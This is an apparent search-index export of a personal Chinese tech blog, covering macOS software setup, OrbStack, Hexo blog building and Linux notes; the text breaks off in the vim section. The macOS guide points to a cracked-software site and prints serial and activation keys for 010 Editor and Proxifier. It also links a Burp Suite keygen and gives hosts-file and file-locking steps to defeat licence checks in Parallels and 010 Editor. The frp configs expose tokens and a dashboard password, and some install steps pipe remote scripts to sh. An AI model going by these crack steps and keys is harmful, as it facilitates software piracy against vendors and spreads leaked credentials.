[{"title":"macOS配置/使用指南","path":"/2024/02/27/MacOS-Guide/","content":"前言如果你只用过Windows系统，那么初上手macOS肯定会有很多用不懂的地方，但如果你还用过基于Linux的系统，那么macOS肯定会给你带来熟悉的感觉，无论如何，写下这篇文章记录自己用mac以来安装和配置各种软件和环境的流程和踩的坑，希望这篇文章能够帮助到阅读时的你和我。 分类可能随时会调整，文章字数缓慢增加中 目录[TOC] 系统设置这个目录下放一些系统层面遇到过的问题 关闭SIP参考https://xie.infoq.cn/article/04edcb1631e161b1898fac486 以2021款Apple Silicon MacBook pro为例子，关机状态下长按开机键，直到出现设置后松开，进入恢复模式。 选择 选项 点击 继续，输入已知用户的密码，在菜单栏选择实用工具–&gt;终端，输入 1csrutil disable 关闭完整性保护，出现turning off …提示，输入y回车，输入用户密码，然后重启，输入 1csrutil status 显示disable即为关闭成功 xxx已损坏无法打开https://zhuanlan.zhihu.com/p/135948430 1sudo xattr -r -d com.apple.quarantine /Applications/xxx.app 软件安装推荐一个站 https://appstorrent.ru/ ，下面的软件大部分都可以在这里找到 居家必备软件输入法苹果自带的输入法介于好用和不好用之间，候选词不太智能，所以输入法建议装自己用惯的，无所谓的用自带的就行，本人用搜狗输入法 Snipaste-截屏来源：https://www.snipaste.com/download.html ，免费 苹果自带的截屏也挺好用，但是操作起来不太直观，这个软件在Windows上就很好用了，macOS上也一样好用，还有一个软件叫iShot，也挺好用，但是ocr、贴图等模块需要订阅使用 AdDente-电池管理来源：https://apphousekitchen.com/ ，免费版就够用了 电池管理软件，如果你经常插电使用，可以用这个软件限制你的电池电量在一个合理的区间，减缓电池的损耗 超级右键&#x2F;超级右键Lite来源：App Store，收费版的功能多点 前者一年订阅18元，后者完全免费但是用起来比较麻烦，没有全局读写权限，每次在新文件夹创建文件都要重新同意，忍不了的建议用前者，完善了macOS的使用体验 解压工具来源：fastzip：App Store，betterzip：资源站破解 fastzip，betterzip，这两个都不错，可以预览压缩包，支持很多格式的压缩包，前者免费功能丰富，后者收费性能功能都很强大，是一个功能比较完整的解压软件 剪切版应用来源：App Store iCopy，可以记录剪切版历史，补齐了macOS的使用体验，好用，必备 OCR软件来源：App Store iOCR，可以离线识别图片文字，好用 iBar-菜单栏管理来源：App Store 解放macOS拥挤的菜单栏，可以自定义软件间距和谁显示在上面 State-系统状态显示来源：App Store 显示电脑状态，有很丰富的插件功能，对判断系统状态帮助很大，开发人员必备 iina-播放器开源好用的播放器，项目地址 https://github.com/iina/iina 下载地址：https://iina.io/download/ 1brew install --cask iina 屏幕保护程序-时钟下载地址：https://fliqlo.com/ 十分实用的屏保 OBS-录屏软件下载地址：https://obsproject.com/zh-cn/download macOS不能直接录制自己电脑的声音，可以搭配Loopback使用 iTerm2代替苹果自带终端 配置教程 https://juejin.cn/post/6994453537690222599 美化参考文章 https://zhuanlan.zhihu.com/p/441676276 项目oh-my-zsh，https://github.com/ohmyzsh/ohmyzsh 安装oh-my-zsh 网络环境好的可以用下面的一句话安装 1sh -c &quot;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot; 网络环境不行的可以试试这个 1sh -c &quot;$(curl -fsSL https://install.ohmyz.sh/)&quot; 安装成功后原始的.zshrc文件会变成.zshrc.pre-oh-my-zsh，将原本的环境变量复制到新的.zshrc文件就可以和安装前一样正常使用了 修改主题 使用 powerlevel10k 主题，项目地址 https://github.com/romkatv/powerlevel10k 1git clone --depth=1 https://github.com/romkatv/powerlevel10k.git $&#123;ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom&#125;/themes/powerlevel10k 使用 vim 编辑 .zshrc，键入以下内容并保存： 1ZSH_THEME=&quot;powerlevel10k/powerlevel10k&quot; 最后，执行 source ~/.zshrc 配置生效，这时会提示对主题进行配置，按照提示进行即可。（安装过程可能需要良好的网络环境） 添加插件 zsh-autosuggestions 是一个命令提示插件，他从history里面和你当前输入的字符推测你想输入的命令，按下右键可以快速采用建议。把插件下载到本地 1git clone https://github.com/zsh-users/zsh-autosuggestions $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-autosuggestions zsh-syntax-highlighting 是一个命令语法校验插件，在输入命令的过程中，若指令不合法，则指令显示为红色，若指令合法就会显示为绿色。把插件下载到本地 1git clone https://github.com/zsh-users/zsh-syntax-highlighting.git $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-syntax-highlighting 在 .zshrc 中，把 zsh-autosuggestions 和zsh-syntax-highlighting 加入插件列表，插件间使用空格分隔 1plugins=(git zsh-autosuggestions zsh-syntax-highlighting) 开启新的 Shell 或执行 source ~/.zshrc，就可以开始体验插件了。 干活软件xmind来源：https://xmind.cn/ 思维导图软件，梳理思路很实用，免费版的就够用 sublime text 4来源：资源站破解 文本工具，轻量好用 010 Editor来源：资源站破解 二进制编辑器 激活码如下，14.0版本可用 123456789101112131415161718192021222324252627282930313233343536010 Editor serials:zhangsan6C98-F39C-7DC8-2D31==========Activation type: SiteName: appstorrentPassword: B8F1-139C-8228-8358Name: appstorrent.ruPassword: A554-139C-5A28-09FD==========Activation type: Single-UserName: appstorrentPassword: 4A14-3E9C-BA56-498AName: appstorrent.ruPassword: 3BEE-629C-F00A-5970==========Activation type: Multi-User (999)Name: appstorrentPassword: 680C-33AC-D63D-E9A5-0FA8Name: appstorrent.ruPassword: 43E1-CAAC-82C4-C248-5B51 记得编辑~/.config/SweetScape/010 Editor.ini文件，避免激活失败 1sudo chmod 444 ~/.config/SweetScape/010\\ Editor.ini 或者是改&#x2F;etc&#x2F;hosts也行 120.0.0.0 *.www.sweetscape.com0.0.0.0 sweetscape.com Postman测试工具，来源：https://www.postman.com/downloads/ Wireshark流量工具，来源：https://www.wireshark.org/download.html 数据库工具Navicat，好使，基本该有的数据库都有，来源：资源站破解 没有的可以用dbeaver来连接，https://dbeaver.io/download/ MongoDB compass，连接MongoDB首选 https://www.mongodb.com/try/download/compass openVPN connect代理工具，来源：https://openvpn.net/client/ burpsuite包重放工具 https://portswigger.net/burp/releases macOS dmg安装配置指南：https://www.lzskyline.com/index.php/archives/121/ jar包配置指南： https://portswigger.net/burp/releases https://github.com/lzskyline/BurpLoaderKeygen 下载jar包，和注册机放在一个目录下，环境用jdk11+，启动注册机，手动破解 Jetbrains toolbox工具箱 https://www.jetbrains.com/toolbox-app/ typoramarkdown编辑工具，好用，国区价格便宜，可以找人一起拼车 来源：https://typora.io/，或者资源站破解 picgo联动typora的图床工具，项目地址 https://github.com/Molunerfinn/PicGo 使用文档 https://picgo.github.io/PicGo-Doc/zh/guide/ proxifier代理工具 https://www.proxifier.com/ macOS激活码 12387PZC-V3C3H-GTLYP-ZENEQ-2GJLTNBBCX-D242M-F97WB-ZENEQ-7VH3HP427L-9Y552-5433E-8DSR3-58Z68 royal tsx来源：资源站破解 一个功能挺多的终端管理软件 Visual code studioIDE https://code.visualstudio.com/ nmap端口存活指纹识别扫描工具 https://nmap.org/ 环境配置xcode在App Store下载的和xcode命令行工具好像没关联，如果你不用xcode开发的话不建议在App Store下载，那玩意很大，差不多三四十个G 用命令行下载 1xcode-select --install brewhttps://brew.sh/ 一键安装，如果你还没有安装 Xcode 命令行工具，你会看到一个信息：“Xcode 命令行工具将被安装”。在 Homebrew 安装脚本的提示下，按返回键继续。 1/bin/bash -c &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)&quot; 安装完成之后运行 12(echo; echo &#x27;eval &quot;$(/opt/homebrew/bin/brew shellenv)&quot;&#x27;) &gt;&gt; /Users/fr3nky/.zprofileeval &quot;$(/opt/homebrew/bin/brew shellenv)&quot; 执行brew help验证安装 Miniforge - （anaconda代替物）新的 Mamba 用来替代 conda，提供更快的速度。使用上用mamba替换掉conda 就行，其他用法完全一致。 安装方法1：一键安装，安装最后一步询问写入系统变量输入yes 12curl -L -O &quot;https://github.com/conda-forge/miniforge/releases/latest/download/Miniforge3-$(uname)-$(uname -m).sh&quot;bash Miniforge3-$(uname)-$(uname -m).sh 方法2：用brew安装 1brew install miniforge 配置环境conda和mamba指令都可以用 安装sage环境12mamba create -n sage sage python=X # eitherconda create -n sage sage python=X # or where X is version of Python, e.g. 3.9. To use Sage from there, Enter the new environment: conda activate sage Start SageMath: sage apple silicon安装python2环境1CONDA_SUBDIR=osx-64 mamba create -n py27 python=2.7 卸载Uninstalling Miniforge means removing the files that were created during the installation process. You will typically want to remove: Any modifications to your shell rc files that were made by Miniforge: 1234567# Use this first command to see what rc files will be updatedconda init --reverse --dry-run# Use this next command to take action on the rc files listed aboveconda init --reverse# Temporarily IGNORE the shell message# &#x27;For changes to take effect, close and re-open your current shell.&#x27;,# and CLOSE THE SHELL ONLY AFTER the 3rd step below is completed. Remove the folder and all subfolders where the base environment for Miniforge was installed: 123456CONDA_BASE_ENVIRONMENT=$(conda info --base)echo The next command will delete all files in $&#123;CONDA_BASE_ENVIRONMENT&#125;# Warning, the rm command below is irreversible!# check the output of the echo command above# To make sure you are deleting the correct directoryrm -rf $&#123;CONDA_BASE_ENVIRONMENT&#125; Any global conda configuration files that are left behind. 1234echo $&#123;HOME&#125;/.condarc will be removed if it existsrm -f &quot;$&#123;HOME&#125;/.condarc&quot;echo $&#123;HOME&#125;/.conda and underlying files will be removed if they exist.rm -fr $&#123;HOME&#125;/.conda Javahttps://www.oracle.com/java/technologies/downloads/ 在官网按需安装java版本 没有特殊版本需求的话可以直接用brew安装 1brew install --cask oracle-jdk 用jenv管理环境 Jenv 1234brew install jenv/usr/libexec/java_home -Vjenv add [path] golanghttps://go.dev/ apk安装自动配置环境变量 NodeJsHexo 基于 NodeJS 运行，因此在开始前，需要安装NodeJS 和 npm 工具 到NodeJS官方下载站下载对应操作系统版本的安装包安装 用brew包管理系统，可以直接一句话安装 1brew install node 无论使用哪种方式安装NodeJS，安装完成之后记得打开终端输入以下命令验证安装结果，有回显就证明安装成功 12npm -vnode -v 命令行工具svn 1brew install svn inetutils ftp&#x2F;tftp&#x2F;telnet … 1brew insatll inetutils wget 1brew install wget apktool 1brew install apktool 微信聊天记录迁移macOS to macOS 参考 https://www.machunjie.com/macos/1341.html 防撤回微信小助手，项目地址 https://github.com/MustangYM/WeChatExtension-ForMac ，建议进作者tg群有打好的包可以直接dmg拖动安装 安装之后再菜单栏中有微信小助手，进入设置开启防撤回功能 添加小助手之后如果打不开小程序或者文章可以添加签名解决 1234[修复]小程序和连接打不开sudo xattr -rd com.apple.quarantine /Applications/WeChat.app/Contents/MacOS/WeChatAppEx.appsudo codesign --force --deep --sign - /Applications/WeChat.app/Contents/MacOS/WeChatAppEx.appsudo codesign --force --deep --sign - /Applications/WeChat.app/Contents/MacOS/WeChatAppEx.app/Contents/Frameworks/WeChatAppEx\\ Framework.framework/Versions/C/Helpers/WeApp.app QQ聊天记录迁移macOS to macOS https://www.zhihu.com/question/25667176 和微信的格式一摸一样 防撤回项目地址 https://github.com/LiteLoaderQQNT/LiteLoaderQQNT，有一键安装脚本，比较方便，本人qq版本: 6.9.29-21484完美运行 下载安装LiteLoader之后在插件市场安装防撤回 虚拟机Parallels穷鬼安装方法 https://luoxx.top/archives/pd-18-active?cid=683 作者强烈建议使用 pd19.1.0 搭配 补丁4.0.0，这个才是最稳定，最好用的版本。 编辑&#x2F;etc&#x2F;hosts文件，屏蔽盗版检测 1234567891011121314151617181920212223242526127.0.0.1 update.parallels.com127.0.0.1 desktop.parallels.com127.0.0.1 update.parallels.com.cdn.cloudflare.net127.0.0.1 desktop.parallels.com.cdn.cloudflare.net127.0.0.1 www.parallels.cn127.0.0.1 www.parallels.com127.0.0.1 www.parallels.de127.0.0.1 www.parallels.es127.0.0.1 www.parallels.fr127.0.0.1 www.parallels.nl127.0.0.1 www.parallels.pt127.0.0.1 www.parallels.ru127.0.0.1 www.parallelskorea.com127.0.0.1 reportus.parallels.com127.0.0.1 parallels.cn127.0.0.1 parallels.com127.0.0.1 parallels.de127.0.0.1 parallels.es127.0.0.1 parallels.fr127.0.0.1 parallels.nl127.0.0.1 parallels.pt127.0.0.1 parallels.ru127.0.0.1 parallelskorea.com127.0.0.1 pax-manager.myparallels.com127.0.0.1 myparallels.com127.0.0.1 my.parallels.com 实测pd开启虚拟机的时候会修改&#x2F;etc&#x2F;hosts文件，锁定文件能解决 锁定&#x2F;etc&#x2F;hosts文件 1sudo chflags uchg /etc/hosts &amp;&amp; sudo chflags schg /etc/hosts 需要编辑的时候输入一下命令解锁 1sudo chflags nouchg /etc/hosts &amp;&amp; sudo chflags noschg /etc/hosts orbstack支持docker，k8s，占用比docker-desktop低，还能够实现类似windows里面wsl的功能，目前个人使用免费，强烈推荐用这个来开docker容器 https://orbstack.dev/ 安装使用指南 安全软件（说实话很少看见有人会往macOS里安装杀软 对macOS杀软感兴趣可以看看这篇文章 https://sspai.com/post/61796，介绍的都是免费的应用，当然也有付费的防火墙 Little Snitch LuLu真要装的话LuLu就挺好，挺好用的一个防火墙软件 https://objective-see.org/products/lulu.html，可以控制每一个软件的出网 项目地址 https://github.com/objective-see/LuLu 下载这个app自带了一个Netiquette。用于监测目前活动的所有网络连接 别地找的必装软件，仅供参考 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118PS F:『装机必备』装机必备 Mac&gt; tree /f卷 Elements SE 的文件夹 PATH 列表卷序列号为 B2CE-66A8F:.1Password_7_v7.9.4_[TNT].dmgABBYY FineReader PDF 15.2.8_MacApp.dmgACDSee_Photo_Studio_9_9.0.2673_[TNT]_.dmgAcrobat_DC_2022.002.20191_U2B_PATCH_RiD.pkgAdGuard 2.9.2.1220 nightly_MacApp.dmgAdobe Photoshop 24.0.0_MacApp.dmgAdobe_Acrobat_DC_2022.002.20191_U2B_AIO_RiD.dmgAntSword-Loader-v4.0.3-darwin-x64.dmgApp Cleaner &amp; Uninstaller 8.0.4_MacApp.dmgApple Remote Desktop 3.9.6 MAS_MacApp.dmgbaiduinput_mac_v5.7.0.16_1000e.dmgBandizip 365 7.19_MacApp.dmgBandizip 7.19_MacApp.dmgBetterTouchTool 3.986_MacApp.dmgBetterZip_5.3_[TNT]_Torrentmac.net.dmgBeyond Compare 4.4.4_MacApp.dmgClashX Pro.dmgClashX.dmgCrossOver 22.0.1_MacApp.dmgCTFCrackTools-4.0.4.dmgdouyin-v1.5.3-darwin-universal-wid-8yesceObiZx.dmgDownie 4.6.4_MacApp.dmgDuplicate File Finder Pro 7.0.5_MacApp.dmgDynamic Wallpaper 13.0_MacApp.dmgEaseUS_Data_Recovery_Wizard-Pro_13.8.5_Downloadly.ir.dmgEudic 4.2.9_MacApp.dmgGMRightMouse Pro 2.5.4_MacApp.dmggo1.19.4.darwin-amd64.pkgGoogleChrome-108.0.5359.124.dmgHRSword_Installer.dmgIconChanger.zipInfuse Pro 7.4.10 MAS_MacApp.dmgiRightMouse Pro 2.2.1_MacApp.dmgjdk-11.0.17_macos-x64_bin.dmgjdk-11.0.17_macos-x64_bin.tar.gzjdk-17_macos-x64_bin.dmgjdk-17_macos-x64_bin.tar.gzjdk-19_macos-x64_bin.dmgjdk-19_macos-x64_bin.tar.gzjdk-8u351-macosx-x64.dmgJump_Desktop_8.9.10_MAS_[TNT]_Torrentmac.net.dmgKeep_It_2.1.6_[TNT]_Torrentmac.net.dmgLemonV511.dmglisten1 2.27.0_MacApp.dmglisten1_2.27.0_mac_universal.dmglisten1_2.27.0_mac_x64.dmgMAMP Pro 6.6.4_MacApp.dmgMDUT.dmgMicrosoft Office LTSC 2021 16.69 beta_MacApp.dmgMicrosoft Office LTSC 2021 Crack_MacApp.dmgMicrosoft_Office_16.68.22121100_BusinessPro_Installer.pkgMicrosoft_Office_LTSC_2021_VL_Serializer.pkgMind Manager 13.1.115_MacApp.dmgMindjet mindmanager 13.1.115 中文破解版 (一款思维导图软件).dmgMindjet mindmanager模板（600+）.dmgMp3tag_1.7.0_[TNT]_.dmgNavicat Premium 16.1.5_MacApp.dmgNeatDMInstaller.dmgNeatDownloadManager 1.3 (24) (多线程下载工具).dmgNeteaseMusic_2.3.6_862_web_.dmgnmap-7.93.dmgopenjdk-19.0.1_macos-x64_bin.tar.gzPalmInput_1.1.27.dmgParallels Desktop 18.1.1_MacApp.dmgParallels Toolbox 6.0.1_MacApp.dmgParallels Toolbox Business Edition 6.0.1 [HCiSO]_Torrentmac.net.dmgParallelsDesktop-18.1.1-53328.dmgParallelsDesktopCrack-18.1.1.53328.tar.gzParallelsDesktopCrack-18.1.1.53328.zipParallelsDesktopCrack-main.zipParallelsToolbox-6.0.1-4541_Crack.dmgParallelsToolboxCrack-6.0.1.4541.zipParallelsToolboxCrack-main.zipPDF Expert 2.5.21 MAS_MacApp.dmgPDF_Expert_2.5.21_macwk.com.dmgphpstudy_install.dmgProFind_1.19.0_[TNT]_Torrentmac.net.dmgQQMusicMac_Mgr.dmgQQ_v6.9.2-7809.dmgRoyal TSX 5.1.2.1000_MacApp.dmgSecureCRT+SecureFX-9.2.3-OSX.zipShottr 1.6.1_MacApp.dmgSnagit 2023.0.2_MacApp.dmgSnipaste-2.8.3-Beta2.dmgSoundSource 5.5.7fc1_MacApp.dmgsqlmap-master.zipStellarPlayer_2.410.62_Release_third-party_gw.dmgSublime_Text_Build_4147_[TNT]_Torrentmac.net.dmgTampermonkey 4.17.6162_MacApp.dmgTencentMeeting_0300000000_3.13.5.435.publish.x86_64.dmgTuxera NTFS 2021.1_MacApp.dmgTuxera NTFS_2021.1.dmgTypora 1.4.8_MacApp.dmgUltraEdit 22.0.0.16_MacApp.dmgVSCode-darwin-universal.zipVSCode-darwin.zipWarp.dmgWindTerm_2.5.0_Mac_Portable_x86_64.dmgWondershare PDFelement Pro 9.2.2_MacApp.dmgWPS_Office_5.1.1(7662)_universal.dmgXmind 22.11.2677_MacApp.dmg稻壳阅读器安装程序.dmgCharset 0.5.5.crx ChatGPT for Google_1_1_0_0.crx ChatGPT for Google_1_1_0_0.zip Ctool 程序开发常用工具_1_11_1_0.crx FindSomething_2_0_11_0.crx Hack-Tools_0_4_0_0.crx JSON Formatter_0_6_3_0.crx Proxy SwitchyOmega 2.5.21.crx Shodan 1.1.0.crx Tabbed Postman - REST Client 0.8.4.22.crx Tampermonkey_4_18_0_0.crx User-Agent Switcher and Manager_0_4_8_0.crx Wappalyzer_6_10_48_0.crx WebSocket Test Client 0.2.0.crx X-Forwarded-For Header 0.6.2.crx","tags":["笔记","操作系统","macOS"],"categories":["笔记","操作系统"]},{"title":"OrbStack使用指南","path":"/2024/02/21/OrbStack/","content":"macOS的docker desktop太臃肿了，占地大而且小号资源多，最近发现一个软件叫OrbStack，轻量且资源占用少，还可以在mac上实现类似Windows中WSL的功能，十分强大，在此推荐 下载安装包地址 https://orbstack.dev/download 或者brew一键安装 1brew install orbstack 使用进入linux虚拟机指令 12orb #进入默认机器orb -m [machine_name] #进入指定机器 OrbStack创建的linux机器都是轻量化的的，很少东西，要自己apt install 以kali的举例 123456kali@kali:~$ sudo apt updatekali@kali:~$kali@kali:~$ sudo apt full-upgrade -ykali@kali:~$kali@kali:~$ sudo apt install -y kali-linux-defaultkali@kali:~$","tags":["笔记","虚拟机","OrbStack"],"categories":["笔记","虚拟机"]},{"title":"博客搭建笔记","path":"/2024/02/02/个人博客搭建/","content":"本文主要介绍 Github Pages + Hexo 的方式来搭建个人博客 前言学计算机也三年多了，大一的时候老师就说要有一个自己的博客，不管是csdn还是博客园都可以（这两个确实有了，但是感觉不够装B），但最好是自己搭建一个，过程中可以学到很多东西，但是小弟生性懒惰，这个事情一直写在todo list里，但是也一直没有do，前段时间找了个实习做，好像一直都很忙（其实闲时也不少），一直想要在没项目的时候把这个博客搞起来，但是没项目的时候不是在刷靶场&#x2F;打ctf&#x2F;总结项目经验，就是在摸鱼😅，简直是胡适附身了，不能再这样下去了！遂作此文记录博客搭建过程。 操作系统环境介绍一下本人OS的环境 1MacBook Pro (13-inch, M1, 2020)/ macOS 12.7/ Apple M1 得益于arm架构优秀的能耗比，这台电脑从21年5月用到现在电池都还十分坚挺，平时跑个虚拟机、ide之类中度办公一天都是不用充电的，但就是这arm架构太麻烦，到现在都还有很多东西是通过转译也无法运行的，还得多准备一台x86_64架构的主机才行，真是好好又坏坏啊 0. 准备工作都是学CS的人了，那肯定是比较熟悉类unix系统了（不熟悉也给我去熟悉，迟早得干这事），全程的大部分操作以及工具安装的大概都是通过命令行来操作，以及访问一些网站可能需要使用加速节点。 0.1 GitHub注册前往GitHub，点击导航栏上的Sign up来注册 登陆新建仓库注册完成之后登陆进去，在repositories这个tab里面新建一个仓库 Repository name需要按照这个格式填写&lt;GitHub用户名&gt;.github.io 例如我的用户名是FrenkyOHOHOH，那么我的仓库名称就是FrenkyOHOHOH.github.io，你的用户名是ZhangSan，那么你的仓库名称就是ZhangSan.github.io 其他的默认就好，如图 安装git参考教程1.5 起步 - 安装 Git 配置 GitHub Pages在本地新建一个文件夹，名字随意，添加一个README.md文件，然后push到远端仓库，这里push的时候可能会遇到一些问题，因为2021年之后github不支持git的密码验证了，要配置ssh密钥，可以参考官方教程配置 生成新的 SSH 密钥并将其添加到 ssh-agent 新增 SSH 密钥到 GitHub 帐户 测试 SSH 连接 首先在本地新建一个目录用于存放接下来git博客项目的文件，然后进入文件夹 12mkdir blogcd blog 把文件推送到git远程仓库，这里涉及到git指令的使用 123456789echo &quot;# &lt;GitHub用户名&gt;.github.io&quot; &gt;&gt; README.md# echo &quot;# FrenkyOHOHOH.github.io&quot; &gt;&gt; README.mdgit initgit add README.mdgit commit -m &quot;first commit&quot;git branch -M maingit remote add origin git@github.com:&lt;GitHub用户名&gt;/&lt;GitHub用户名&gt;.github.io.git# git remote add origin git@github.com:FrenkyOHOHOH/FrenkyOHOHOH.github.io.gitgit push -u origin main （可选）如果嫌上述方法麻烦，也可以登陆新建仓库的时候直接勾选Add a README file，但将失去上手git命令的机会，然后记得将仓库通过 git clone 命令克隆到本地 然后在 &lt;GitHub用户名&gt;.github.io 仓库对应的 GitHub Pages 设置页面 (访问路径为Settings -&gt; Pages) 可以找到个人博客的主页访问地址：https:&#x2F;&#x2F;&lt;GitHub 用户名&gt;.github.io。 若能在浏览器中正常访问该地址，看到类似下图的界面，即代表个人 GitHub Pages 搭建成功。 GitHub Pages 配置域名（可选）如果你有一个自己的域名，或者是不喜欢xxxxx.github.io这个URL，你可以给你的博客配置一个域名 参考管理 GitHub Pages 站点的自定义域 0.2 安装 NodeJSHexo 基于 NodeJS 运行，因此在开始前，需要安装NodeJS 和 npm 工具 到NodeJS官方下载站下载对应操作系统版本的安装包安装 如果你的OS是macOS又恰好用brew包管理系统，可以直接一句话安装 1brew install node 无论使用哪种方式安装NodeJS，安装完成之后记得打开终端输入以下命令验证安装结果，有回显就证明安装成功 12npm -vnode -v 0.3 安装 HexoHexo官网有详细教程，这里简单写写，有详细的安装要求，如果遇到报错里面都有解决方案。 安装前提安装 Hexo 相当简单，只需要先安装下列应用程序即可： Node.js (Node.js 版本需不低于 10.13，建议使用 Node.js 12.0 及以上版本) Git 如果您的电脑中已经安装上述必备程序，那么恭喜您！你可以直接前往 安装 Hexo 步骤。 如果您的电脑中尚未安装所需要的程序，请根据以下安装指示完成安装。 安装 Hexo所有必备的应用程序安装完成后，即可使用 npm 安装 Hexo。 1npm install -g hexo-cli 验证安装成功 123456789101112131415161718192021$ hexo -vhexo-cli: 4.3.1os: darwin 21.6.0 12.7node: 16.17.0v8: 9.4.146.26-node.22uv: 1.43.0zlib: 1.2.11brotli: 1.0.9ares: 1.18.1modules: 93nghttp2: 1.47.0napi: 8llhttp: 6.0.7openssl: 1.1.1q+quiccldr: 41.0icu: 71.1tz: 2022aunicode: 14.0ngtcp2: 0.1.0-DEVnghttp3: 0.1.0-DEV 1. hexo项目进入你git项目的文件夹，在步骤0.1配置 GitHub Pages 建立的文件夹路径下中打开终端即可，如果新建仓库时没有从本地推送到远程仓库的，git clone 你的仓库下来在对应文件夹的路径打开终端。以下步骤的也可以查看官方教程——建站，这一部分内容都可以在官方中文文档中找到详细的说明，如果有任何疑问可以去阅读官方文档，要养成阅读官方文档的良好习惯 1.1 初始化创建项目123hexo init hexo_blogcd hexo_blognpm install 这一步完成之后hexo项目的根目录就是上面初始化的hexo_blog目录，如果没有特殊说明，下面的操作都在hexo项目的根目录操作 1.2 静态页面及启动服务12hexo generate # 生成页面，此命令可以简写为 hexo ghexo server # 本地启动，可简写为 hexo s 启动之后就可以在 http://localhost:4000/ 看到如下界面了 做到这一步恭喜你，已经完成了博客的搭建，剩下的就是往里面写东西了！ 1.3 开始写作如何写作这一部分暂时不过多阐述，官方中文文档里有详细的介绍，这里就先挖个坑吧，以后慢慢再补充 1.4 发布 GitHub Pages本段摘自官方文档一键部署的git部分，做了一些更改 安装 hexo-deployer-git。 1npm install hexo-deployer-git --save 修改_config.yml配置。 123456deploy: type: git repo: &lt;repository url&gt; # git@github.com:&lt;GitHub用户名&gt;/&lt;GitHub用户名&gt;.github.io.git branch: [branch] # 默认是gh-pages message: [message] # commit token : [可选的令牌值，用于认证 repo。] 生成站点文件并推送至远程库。执行 12hexo cleanhexo deploy 除非你使用令牌或 SSH 密钥认证，否则你会被提示提供目标仓库的用户名和密码。值得留意的是token的话生成的时候记得保存，只会出现一次。 hexo-deployer-git 并不会存储你的用户名和密码. 请使用 git-credential-cache 来临时存储它们。 登入 Github&#x2F;BitBucket&#x2F;Gitlab，请在库设置（Repository Settings）中将默认分支设置为_config.yml配置中的分支名称。稍等片刻，您的站点就会显示在您的Github Pages中。 以下为可选部分，不影响博客的使用 2. 进阶 —— 美化博客官方默认的这个主题有点过于简洁了，所以我们可以去hexo官网的themes栏里面找社区开发者提供的其他主题来替换上，接下来的部分就是如何替换主题，比较多人用的主题就是fluid、butterfly、和cactus，萝卜青菜各有所爱，我将会用stellar主题来做示范如何切换主题。以下教程参考官方wiki编写。 2.1 给hexo项目更换主题在hexo项目根目录打开终端，输入 1npm i hexo-theme-stellar 在 _config.yml 文件中找到并修改： 1234# Extensions## Plugins: https://hexo.io/plugins/## Themes: https://hexo.io/themes/theme: stellar 在终端中启动本地服务，即可看到更换主题后的效果 1hexo s 主题的配置可以参考Stellar官方文档解决 2.2 stellar主题目前还在研究hexo和这个主题的各种操作，慢慢填坑","tags":["博客","git","hexo","stellar"],"categories":["笔记","建站"]},{"title":"OS-Linux学习笔记","path":"/2024/02/02/linux/","content":"文档大致情况：总结比赛和日常了解到的一些linux知识 查看主机信息参考文章：https://blog.csdn.net/qq_31278903/article/details/83146031 1234567891011ifconfiguname －a （Linux查看版本当前操作系统内核信息）cat /proc/version\t（Linux查看当前操作系统版本信息）cat /etc/issue\t或\tcat /etc/redhat-release（Linux查看版本当前操作系统发行版信息）cat /proc/cpuinfo 或 lscpu （Linux查看cpu相关信息，包括型号、主频、内核信息等）getconf LONG_BIT （Linux查看版本说明当前CPU运行在32bit模式下， 但不代表CPU不支持64bit）hostname （查看服务器名称）lsblk （查看磁盘信息 - 列出所有可用块设备的信息，而且还能显示他们之间的依赖关系，但是它不会列出RAM盘的信息）fdisk -l （观察硬盘实体使用情况，也可对硬盘分区）df -k （用于显示磁盘分区上的可使用的磁盘空间）echo $? # 输出上条指令的执行状态，0代表执行成功，其他数字执行失败 frp维护123netstat -anp |grep frp #查看frp连接情况/进程号ps -e |grep frp #查看frp进程lsof -i | grep frp #查看frp连接情况/进程号（更直观） 客户端Frpc.ini 123456789101112131415[common]server_addr = 远端ipserver_port = 11100token = QaXnB666!@##[ssh]#type = tcp#local_ip = 127.0.0.1#local_port = 22#remote_port = 16001[socks5]type = tcpplugin = socks5remote_port = 17891 服务端Frps.ini 1234567891011121314151617[common]bind_port = 11000dashboard_port = 11500dashboard_user = fr3nkydashboard_pwd = Fr3Nkyvhost_http_port = 9001max_pool_count = 50token = QaXnB666!@#tcp_mux = truelog_file = /root/frp/log/frps.loglog_level = infolog_max_days = 3authentication_timeout = 0 运行脚本frp.sh 123#! /bin/bashsleep 30/home/fr3nky/frp/frpc -c /home/fr3nky/frp/frpc.ini &gt;&gt; /home/fr3nky/frp/log.txt &amp; vi和vimyum&#x2F;apt install vim 编辑模式 (insert mode)，按下“i, o, a, r”等任何一个字母后进入编辑模式，出现 –insert– 命令行命令模式 (command-line mode)，输入“ : &#x2F; ? ”三个中的任何一个按钮，就可以将光标移动到最下面那一列 1234:wq! w: writeq: quit!: 强制 按键说明h 或 向左方向键(←)；j 或 向下方向键(↓)；j 或 向下方向键(↓)；l 或 向右方向键(→) 向下移动 30 列， 可以使用 “30j” 或 “30↓” 的组合按键 [Ctrl] + [f]：相当于 [Page Down] [Ctrl] + [b]：相当于 [Page Up] [Ctrl] + [d]：屏幕“向下”移动半页 [Ctrl] + [u]：屏幕“向上”移动半页 +：光标移动到非空白字符的下一列 -：光标移动到非空白字符的上一列 n&lt;space&gt;：那个 n 表示“数字”，例如 20 。按下数字后再 按空白键，光标会向右移动这一列的 n 个字 符。例如 20&lt;space&gt; 则光标会向后面移动 20 个字符距离。 0 或功能键[Home]：这是数字“ 0 ”:移动到这一列的最前面字符处 (常用) $ 或功能键[End]：移动到这一列的最后面字符处(常用) H：光标移动到这个屏幕的最上方那一列的第一个字符 M：光标移动到这个屏幕的中央那一列的第一个字符 G：移动到这个文件的最后一列(常用) nG：n 为数字。移动到这个文件的第 n 列。例如 20G 则会移动到这个文件的第 20 列(可配合 :set nu) gg：移动到这个文件的第一列，相当于 1G(常用) 查找在 normal 模式下按下 / 即可进入查找模式，输入要查找的字符串并按下回车。 Vim 会跳转到第一个匹配。按下 n 查找下一个，按下 N 查找上一个。 Vim 